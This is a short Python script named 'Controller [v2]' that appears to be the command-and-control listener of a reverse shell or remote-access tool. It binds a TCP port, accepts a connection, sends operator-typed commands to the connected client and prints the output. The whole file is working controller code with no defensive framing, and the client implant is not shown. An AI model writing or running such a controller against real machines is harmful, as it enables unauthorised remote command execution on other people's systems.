#!/usr/bin/python3
# Controller [v2]
import os
import sys
import socket

def socket_create():
    #defining variables
    try:
        global host
        global port
        global s

        host = "127.0.0.1"
        port = 8080
        s = socket.socket()

    except socket.error as msg:
        print(f"[-] Error: {str(msg)}")
    
# Appointment of socket and listener
def socket_bind():
    try:
        global host
        global port
        global s

        print(f"[*] Info: Binding on {host} to port {str(port)}")

        s.bind((host, port))
        s.listen(5)

    #Repeating function on failure
    except socket.error as msg:
        print(f"[-] Error: {str(msg)}Trying again!")
        socket_bind()

#Accept of connection
def socket_accept():

    conn, address = s.accept()
    print(f"[+] Successful: Socket accepted {host}:{str(port)}")
    # Start function to send/recieve commands
    send_commands(conn)
    conn.close()

# Function for sending/recieving data
def send_commands(conn):
    # Create cycle for input
    while True:
        cmd = input()
        # Check for the exit command
        if cmd == "exit":
            conn.close()
            s.close()
            sys.exit()
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(4096), "utf-8")
            print(client_response, end="")

# Main function starts the program
def main():
    socket_create()
    socket_bind()
    socket_accept()

# Execution of main function
main()